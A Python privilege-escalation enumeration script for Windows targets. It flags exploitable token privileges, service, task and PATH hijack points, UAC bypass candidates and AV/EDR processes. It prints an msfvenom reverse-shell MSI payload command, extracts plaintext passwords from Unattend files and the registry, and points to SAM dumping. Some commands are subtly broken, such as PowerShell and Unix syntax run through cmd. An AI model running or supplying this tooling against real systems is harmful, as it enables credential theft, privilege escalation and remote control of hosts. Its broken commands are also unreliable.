#!/usr/bin/env python3
"""
wincheck.py — Windows privilege escalation checker
===================================================
Pure stdlib. Run on Windows target as any user.
Python 3.6+ required (uses winreg, ctypes, wmi via subprocess).

Usage:
    python wincheck.py
    python wincheck.py --out report.txt
    python wincheck.py --section tokens
    python wincheck.py --fast

Sections:
    sysinfo     OS version, patches, architecture
    tokens      Current token privileges (SeImpersonate, SeAssignPrimaryToken etc.)
    services    Unquoted service paths, weak permissions on service binaries/configs
    registry    AlwaysInstallElevated, AutoRun keys, stored credentials
    tasks       Scheduled tasks — writable scripts, unusual task owners
    paths       PATH directory permissions — DLL/EXE hijack opportunities
    files       World-writable dirs, interesting files (passwords, keys, config)
    users       Local users, groups, last logons
    network     Listening ports, firewall status, network shares
    software    Installed software / patch level
    tokens      Token privilege analysis
    uac         UAC level and bypass candidates
"""

import sys, os, subprocess, re, argparse, time, platform
from pathlib import Path

if sys.platform != "win32":
    print("[!] wincheck.py is designed for Windows targets.")
    print("    Running in demo/dry-run mode — output will be limited.\n")

# ── Colours (works in modern Windows terminals too) ───────────────────────────
try:
    import ctypes
    ctypes.windll.kernel32.SetConsoleMode(ctypes.windll.kernel32.GetStdHandle(-11), 7)
except Exception:
    pass

R="\033[31m"; G="\033[32m"; Y="\033[33m"; C="\033[36m"; B="\033[1m"; M="\033[35m"; X="\033[0m"
USE_COLOR = True

OUTPUT_LINES = []

def _print(msg="", colour=""):
    line = f"{colour}{msg}{X}" if colour else msg
    print(line, flush=True)
    OUTPUT_LINES.append(re.sub(r'\033\[[0-9;]*m', '', line))

def banner(title):
    bar = "═" * 64
    _print(f"\n{B}{C}{bar}{X}")
    _print(f"{B}{C}  {title}{X}")
    _print(f"{B}{C}{bar}{X}")

def hit(msg):  _print(f"  {R}[!]{X} {msg}")
def warn(msg): _print(f"  {Y}[*]{X} {msg}")
def good(msg): _print(f"  {G}[+]{X} {msg}")
def info(msg): _print(f"  {C}[-]{X} {msg}")
def sub(msg):  _print(f"      {msg}")

def run(cmd, timeout=20) -> str:
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=True, text=True,
            timeout=timeout, encoding="utf-8", errors="replace",
        )
        return (r.stdout + r.stderr).strip()
    except Exception as e:
        return f"(error: {e})"

def reg_read(key: str, value: str = None) -> str:
    try:
        import winreg
        parts = key.split("\\", 1)
        hive_map = {
            "HKLM": winreg.HKEY_LOCAL_MACHINE,
            "HKCU": winreg.HKEY_CURRENT_USER,
            "HKCR": winreg.HKEY_CLASSES_ROOT,
            "HKU":  winreg.HKEY_USERS,
        }
        hive = hive_map.get(parts[0].upper(), winreg.HKEY_LOCAL_MACHINE)
        subkey = parts[1] if len(parts) > 1 else ""
        with winreg.OpenKey(hive, subkey, 0, winreg.KEY_READ) as k:
            if value is None:
                return "(key exists)"
            val, _ = winreg.QueryValueEx(k, value)
            return str(val)
    except Exception:
        return None

def reg_values(key: str) -> list[tuple]:
    try:
        import winreg
        parts = key.split("\\", 1)
        hive_map = {
            "HKLM": winreg.HKEY_LOCAL_MACHINE,
            "HKCU": winreg.HKEY_CURRENT_USER,
        }
        hive   = hive_map.get(parts[0].upper(), winreg.HKEY_LOCAL_MACHINE)
        subkey = parts[1] if len(parts) > 1 else ""
        results = []
        with winreg.OpenKey(hive, subkey, 0, winreg.KEY_READ) as k:
            i = 0
            while True:
                try:
                    name, data, _ = winreg.EnumValue(k, i)
                    results.append((name, data))
                    i += 1
                except OSError:
                    break
        return results
    except Exception:
        return []


# ══════════════════════════════════════════════════════════════════════════════
#  SECTIONS
# ══════════════════════════════════════════════════════════════════════════════

def section_sysinfo():
    banner("SYSTEM INFO")
    info(f"Hostname   : {run('hostname')}")
    info(f"OS         : {run('ver')}")
    info(f"Arch       : {platform.machine()}")
    info(f"User       : {run('whoami')}")
    info(f"Domain     : {run('wmic computersystem get domain /value 2>nul | findstr =')}")
    _print()
    info("Installed patches (last 10):")
    patches = run("wmic qfe get HotFixID,InstalledOn /format:csv 2>nul")
    lines = [l.strip() for l in patches.splitlines() if "KB" in l][-10:]
    for l in lines:
        sub(l)

    # Check for juicy unpatched CVEs by build number
    build = run("(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion').CurrentBuildNumber 2>nul")
    if build.isdigit():
        b = int(build)
        if b < 19041:
            hit(f"Build {b} — check CVE-2020-0796 (SMBGhost)")
        if b < 17763:
            hit(f"Build {b} — check CVE-2019-0708 (BlueKeep), MS17-010 (EternalBlue)")
        if b <= 18363:
            hit(f"Build {b} — check CVE-2021-34527 (PrintNightmare) if Print Spooler running")

    # Print Spooler
    spooler = run("sc query spooler 2>nul | findstr /i running")
    if spooler:
        hit("Print Spooler is RUNNING — check PrintNightmare (CVE-2021-1675 / CVE-2021-34527)")


def section_tokens():
    banner("TOKEN PRIVILEGES")
    privs = run("whoami /priv")
    _print(f"  {privs}")
    _print()

    dangerous = {
        "SeImpersonatePrivilege":        "Potato attacks (JuicyPotato, PrintSpoofer, RoguePotato)",
        "SeAssignPrimaryTokenPrivilege": "Potato attacks — same as SeImpersonate",
        "SeBackupPrivilege":             "Read any file (SAM, SYSTEM, NTDS.dit) — reg save HKLM\\SAM",
        "SeRestorePrivilege":            "Write any file — overwrite system binaries",
        "SeTakeOwnershipPrivilege":      "Take ownership of any object, then grant access",
        "SeDebugPrivilege":              "Inject into SYSTEM processes (e.g. lsass dump)",
        "SeLoadDriverPrivilege":         "Load unsigned driver — kernel code execution",
        "SeManageVolumePrivilege":       "Write arbitrary sectors — direct disk manipulation",
        "SeCreateTokenPrivilege":        "Create token with arbitrary groups (direct SYSTEM)",
        "SeTcbPrivilege":               "Act as OS — create tokens, log on any user",
        "SeCreateSymbolicLinkPrivilege": "Symlink attacks on privileged paths",
        "SeRelabelPrivilege":            "Raise integrity level of objects",
    }
    for priv, technique in dangerous.items():
        if priv in privs and "Disabled" not in privs.split(priv)[-1][:30]:
            hit(f"{priv} — {technique}")
        elif priv in privs:
            warn(f"{priv} present but DISABLED (may still be enableable)")


def section_services():
    banner("SERVICES — UNQUOTED PATHS & WEAK PERMISSIONS")

    # Unquoted service paths
    info("Checking for unquoted service paths …")
    out = run(
        'wmic service get name,pathname,startmode /format:csv 2>nul'
    )
    for line in out.splitlines():
        parts = line.split(",")
        if len(parts) < 4:
            continue
        name, path, start = parts[1].strip(), parts[2].strip(), parts[3].strip() if len(parts) > 3 else ""
        if path and not path.startswith('"') and " " in path and not path.startswith("C:\\Windows"):
            hit(f"Unquoted: {name}")
            sub(f"  Path : {path}")
            sub(f"  Mode : {start}")
            # Suggest hijack points
            p = Path(path)
            for parent in list(p.parents)[:-1]:
                candidate = str(parent) + ".exe"
                sub(f"  Try  : {candidate}")

    _print()
    info("Checking service binary permissions …")
    svc_out = run('sc query type= all state= all 2>nul | findstr SERVICE_NAME')
    for line in svc_out.splitlines():
        m = re.search(r'SERVICE_NAME:\s+(\S+)', line)
        if not m:
            continue
        svc_name = m.group(1)
        path_out = run(f'sc qc "{svc_name}" 2>nul | findstr BINARY_PATH_NAME')
        m2 = re.search(r'BINARY_PATH_NAME\s*:\s*(.+)', path_out)
        if not m2:
            continue
        bin_path = m2.group(1).strip().strip('"').split()[0]
        if not bin_path or not Path(bin_path).exists():
            continue
        acl = run(f'icacls "{bin_path}" 2>nul')
        if re.search(r'(Everyone|BUILTIN\\Users|Authenticated Users).*(F|M|W)', acl, re.IGNORECASE):
            hit(f"Writable service binary: {bin_path}  [{svc_name}]")


def section_registry():
    banner("REGISTRY — PRIVESC KEYS")

    # AlwaysInstallElevated
    info("AlwaysInstallElevated check:")
    hklm = reg_read(r"HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer", "AlwaysInstallElevated")
    hkcu = reg_read(r"HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer", "AlwaysInstallElevated")
    if hklm == "1" and hkcu == "1":
        hit("AlwaysInstallElevated = 1 in BOTH HKLM and HKCU — create malicious MSI to get SYSTEM")
        sub("msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o evil.msi")
        sub("msiexec /quiet /qn /i evil.msi")
    else:
        info(f"  HKLM: {hklm}  HKCU: {hkcu}")

    # AutoRun keys
    _print()
    info("AutoRun / persistence registry keys:")
    autorun_keys = [
        r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        r"HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
    ]
    for key in autorun_keys:
        vals = reg_values(key)
        if vals:
            info(f"  {key}:")
            for name, data in vals:
                sub(f"    {name} = {data}")
                # Check if binary is writable
                path_m = re.search(r'"?([A-Za-z]:\\[^"]+\.exe)', str(data))
                if path_m:
                    bin_path = path_m.group(1)
                    if Path(bin_path).exists():
                        acl = run(f'icacls "{bin_path}" 2>nul')
                        if re.search(r'(Everyone|BUILTIN\\Users).*(F|M|W)', acl, re.IGNORECASE):
                            hit(f"Writable AutoRun binary: {bin_path}")

    # Stored credentials
    _print()
    info("Stored credentials (cmdkey):")
    creds = run("cmdkey /list 2>nul")
    if "Target:" in creds:
        good("Stored credentials found:")
        _print(f"  {creds}")
        hit("Use: runas /savecred /user:<user> cmd.exe")
    else:
        info("No stored credentials via cmdkey")

    # Registry passwords
    _print()
    info("Searching registry for passwords …")
    for key in (r"HKLM\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\validcommunities",
                r"HKLM\SOFTWARE\ORL\WinVNC3\Password",
                r"HKLM\SOFTWARE\RealVNC\WinVNC4",
                r"HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions"):
        val = reg_read(key)
        if val:
            hit(f"Interesting registry key: {key}")

    # Search for 'password' in common hive locations
    pw_out = run('reg query HKLM /f password /t REG_SZ /s 2>nul | findstr /i "password" | head -20')
    if pw_out:
        warn("Registry password strings (HKLM):")
        _print(f"  {pw_out[:1000]}")


def section_tasks():
    banner("SCHEDULED TASKS")
    out = run("schtasks /query /fo LIST /v 2>nul")
    current_task = {}
    for line in out.splitlines():
        line = line.strip()
        if line.startswith("TaskName:"):
            if current_task:
                _analyze_task(current_task)
            current_task = {"name": line.split(":", 1)[1].strip()}
        elif ":" in line:
            k, v = line.split(":", 1)
            current_task[k.strip()] = v.strip()
    if current_task:
        _analyze_task(current_task)


def _analyze_task(t: dict):
    name    = t.get("name", "?")
    run_as  = t.get("Run As User", "")
    cmd     = t.get("Task To Run", "")
    status  = t.get("Status", "")

    if run_as.upper() in ("SYSTEM", "NT AUTHORITY\\SYSTEM", "BUILTIN\\ADMINISTRATORS"):
        info(f"Task: {name} (runs as {run_as})")
        sub(f"  Cmd: {cmd}")
        # Check if script is writable
        m = re.search(r'"?([A-Za-z]:\\[^\s"]+\.(bat|ps1|cmd|vbs|py|exe))', cmd)
        if m:
            script = m.group(1)
            if Path(script).exists() and os.access(script, os.W_OK):
                hit(f"Writable task script (runs as SYSTEM): {script}")
            elif not Path(script).exists():
                hit(f"Missing task binary (path hijack, runs as SYSTEM): {script}")


def section_paths():
    banner("PATH — DLL / EXE HIJACK")
    path_env = os.environ.get("PATH", "")
    info(f"PATH: {path_env}\n")
    for d in path_env.split(";"):
        d = d.strip()
        if not d:
            continue
        p = Path(d)
        info(f"  {d}")
        if not p.exists():
            hit(f"  Missing PATH dir — create it to hijack DLL/EXE loads: {d}")
            continue
        # Check write permission via icacls
        acl = run(f'icacls "{d}" 2>nul')
        if re.search(r'(Everyone|BUILTIN\\Users|Authenticated Users).*(F|M|W)', acl, re.IGNORECASE):
            hit(f"  Writable PATH dir: {d} — drop malicious DLL/EXE here")


def section_files():
    banner("INTERESTING FILES")

    info("Searching for files with sensitive names …")
    search_dirs = [
        os.environ.get("USERPROFILE", "C:\\Users"),
        "C:\\inetpub",
        "C:\\xampp",
        "C:\\wamp",
        os.environ.get("ProgramFiles", "C:\\Program Files"),
        os.environ.get("ProgramFiles(x86)", "C:\\Program Files (x86)"),
        "C:\\ProgramData",
    ]
    patterns = ["*pass*", "*secret*", "*.key", "*.pem", "*.pfx", "*.p12",
                "web.config", "*.config", "*.ini", "*.xml", "*.conf",
                "unattend*.xml", "sysprep*.xml", "*.vnc", "*.rdp",
                "id_rsa", "id_ed25519", "*.ovpn", "Thumbs.db"]

    for d in search_dirs:
        if not Path(d).exists():
            continue
        for pat in patterns:
            out = run(f'dir /s /b "{d}\\{pat}" 2>nul', timeout=10)
            for line in out.splitlines()[:5]:
                line = line.strip()
                if line:
                    warn(line)

    # Unattend / sysprep with cleartext passwords
    _print()
    info("Unattend / Sysprep files (often contain cleartext passwords):")
    for path in [
        r"C:\Windows\Panther\Unattend.xml",
        r"C:\Windows\Panther\UnattendGC\Unattend.xml",
        r"C:\Windows\System32\sysprep\sysprep.xml",
        r"C:\Windows\System32\sysprep\Unattend.xml",
        r"C:\unattend.xml",
        r"C:\sysprep.inf",
    ]:
        if Path(path).exists():
            hit(f"Found: {path}")
            try:
                content = Path(path).read_text(errors="replace")
                m = re.search(r'<Password>.*?<Value>(.*?)</Value>', content, re.DOTALL | re.IGNORECASE)
                if m:
                    hit(f"  Plaintext password: {m.group(1)}")
            except Exception:
                pass

    # SAM / SYSTEM backup
    _print()
    info("SAM / SYSTEM backup files:")
    for path in [r"C:\Windows\Repair\SAM", r"C:\Windows\System32\config\SAM",
                 r"C:\Windows\Repair\SYSTEM", r"C:\Windows\System32\config\SYSTEM"]:
        if Path(path).exists():
            if os.access(path, os.R_OK):
                hit(f"READABLE: {path} — dump with impacket secretsdump")
            else:
                info(f"Exists but not readable: {path}")


def section_users():
    banner("LOCAL USERS & GROUPS")
    info("Local users:")
    _print(f"  {run('net user 2>nul')}")
    _print()
    info("Local admins:")
    _print(f"  {run('net localgroup administrators 2>nul')}")
    _print()
    info("Remote Desktop Users:")
    _print(f"  {run('net localgroup \"Remote Desktop Users\" 2>nul')}")
    _print()
    info("Current sessions:")
    _print(f"  {run('query session 2>nul || qwinsta 2>nul')}")


def section_network():
    banner("NETWORK")
    info("Listening ports:")
    _print(f"  {run('netstat -ano 2>nul | findstr LISTENING')}")
    _print()
    info("Network shares:")
    _print(f"  {run('net share 2>nul')}")
    _print()
    info("Firewall status:")
    _print(f"  {run('netsh advfirewall show allprofiles state 2>nul')}")
    _print()
    info("Proxy settings:")
    _print(f"  {run('reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyServer 2>nul')}")


def section_software():
    banner("INSTALLED SOFTWARE / AV")
    info("Installed software (first 30):")
    out = run(
        'wmic product get name,version /format:csv 2>nul | findstr /v "^," | findstr /v "^Node"'
    )
    for line in out.splitlines()[:30]:
        sub(line.strip())

    _print()
    info("Antivirus / EDR products:")
    av = run('wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayName /value 2>nul')
    if av.strip():
        warn(f"AV detected: {av.strip()}")
    else:
        good("No AV detected via WMI SecurityCenter2")

    # Check for common AV processes
    procs = run("tasklist /fo csv /nh 2>nul")
    av_procs = {
        "MsMpEng.exe": "Windows Defender",
        "mcshield.exe": "McAfee",
        "avguard.exe": "Avira",
        "bdagent.exe": "Bitdefender",
        "ekrn.exe": "ESET NOD32",
        "kavfs.exe": "Kaspersky",
        "SentinelAgent.exe": "SentinelOne",
        "CarbonBlack.exe": "CarbonBlack",
        "cb.exe": "CarbonBlack",
        "csagent.exe": "CrowdStrike Falcon",
        "CSFalconService.exe": "CrowdStrike Falcon",
        "cylancesvc.exe": "Cylance",
        "xagt.exe": "FireEye HX",
    }
    for proc, name in av_procs.items():
        if proc.lower() in procs.lower():
            warn(f"AV/EDR process: {proc} ({name})")


def section_uac():
    banner("UAC LEVEL")
    level = reg_read(
        r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
        "ConsentPromptBehaviorAdmin",
    )
    info(f"ConsentPromptBehaviorAdmin: {level}")
    levels = {
        "0": "UAC disabled — no prompt, full elevation",
        "1": "Prompt for credentials on secure desktop",
        "2": "Prompt for consent on secure desktop",
        "3": "Prompt for credentials",
        "4": "Prompt for consent for non-Windows binaries",
        "5": "Prompt for consent for non-Windows binaries (default)",
    }
    if level in levels:
        info(f"  → {levels[level]}")
    if level in ("0", "5", "4"):
        hit(f"UAC level {level} — fodhelper, eventvwr, or other auto-elevate bypasses likely work")

    # Is current user in local admins?
    whoami_groups = run("whoami /groups 2>nul")
    if "S-1-5-32-544" in whoami_groups or "Administrators" in whoami_groups:
        if "Medium" in whoami_groups or "Medium Plus" in whoami_groups:
            hit("User is local admin running at MEDIUM integrity — UAC bypass → SYSTEM")
        elif "High" in whoami_groups:
            good("Already running at HIGH integrity")


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════════════════

ALL_SECTIONS = {
    "sysinfo":  section_sysinfo,
    "tokens":   section_tokens,
    "services": section_services,
    "registry": section_registry,
    "tasks":    section_tasks,
    "paths":    section_paths,
    "files":    section_files,
    "users":    section_users,
    "network":  section_network,
    "software": section_software,
    "uac":      section_uac,
}

def main():
    parser = argparse.ArgumentParser(description="Windows privilege escalation checker")
    parser.add_argument("--out",     help="Save report to file")
    parser.add_argument("--fast",    action="store_true", help="Skip slow filesystem searches")
    parser.add_argument("--section", choices=list(ALL_SECTIONS.keys()), help="Run one section only")
    args = parser.parse_args()

    start = time.time()
    _print(f"\n{B}{'='*64}{X}")
    _print(f"{B}  wincheck.py — Windows Privesc Checker{X}")
    _print(f"{B}  {time.strftime('%Y-%m-%d %H:%M:%S')}  |  {run('hostname')}{X}")
    _print(f"{B}{'='*64}{X}")

    sections = ALL_SECTIONS
    if args.fast:
        sections = {k: v for k, v in ALL_SECTIONS.items() if k not in ("files", "software")}

    if args.section:
        ALL_SECTIONS[args.section]()
    else:
        for fn in sections.values():
            try:
                fn()
            except Exception as e:
                warn(f"Section error: {e}")

    elapsed = time.time() - start
    _print(f"\n{B}Done in {elapsed:.1f}s{X}\n")

    if args.out:
        try:
            Path(args.out).write_text("\n".join(OUTPUT_LINES))
            _print(f"{G}[+] Report saved to {args.out}{X}")
        except Exception as e:
            _print(f"{R}[!] Could not write {args.out}: {e}{X}")


if __name__ == "__main__":
    main()
